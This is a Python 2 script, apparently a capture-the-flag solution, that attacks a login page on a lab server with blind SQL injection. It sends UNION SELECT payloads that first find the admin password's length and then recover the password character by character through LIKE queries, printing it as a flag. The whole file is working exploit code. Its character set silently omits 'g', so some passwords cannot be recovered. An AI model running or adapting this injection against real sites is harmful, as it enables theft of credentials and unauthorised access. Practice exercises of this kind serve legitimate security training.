import urllib2
import sys

HOST = "http://vulnserver-failedxyz.c9.io/login.php"

def con(username , password , char , answer):
    TMP = HOST + "?username=" + username + "&password=" + password
    TMP = TMP.replace(" " , "%20")
    request = urllib2.Request(TMP , "")
    received = urllib2.urlopen(request).read()
    # print received
    if "You're in!" in received:
        answer += char
    return answer

alpha = "abcdefhijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

PREFIX = "\' UNION SELECT * from users where username = \"admin\" AND password LIKE \""
SUFFIX = "%\" -- "

def brute():
    print "Querying pass length..."
    length = get_pass_length()
    print "\nGot password length: " + str(length)
    print "Running brute force..."
    answer = ""
    for i in range(0 , length):
        for c in alpha:
            print(answer + c)
            bkup = answer
            answer = con(PREFIX + answer + c + SUFFIX , "" , c , answer)
            sys.stdout.write("\033[F") # Cursor up one line
            if bkup != answer:
                break

    print ""
    print "FLAG: " + "\033[1;31m" + answer + "\033[m"

def get_pass_length():
    length = 0
    QUERY = "\ ' UNION SELECT * from users where username = \"admin\" AND CHAR_LENGTH(password) > "
    COMMENT = " -- "
    POSITIVE = "You're in!"
    query_status = True
    while query_status:
        OUT = HOST + "?username=" + QUERY + "\033[1;31m" + str(length) + "\033[m" + COMMENT + "&password="
        TMP = HOST + "?username=" + QUERY + str(length) + COMMENT + "&password="
        print "Query: " + OUT
        sys.stdout.write("\033[F") # Cursor up one line
        TMP = TMP.replace(" " , "%20")
        request = urllib2.Request(TMP , "")
        received = urllib2.urlopen(request).read()
        query_status = POSITIVE in received
        length += 1
    return length - 1 # Correct the last increment

brute()
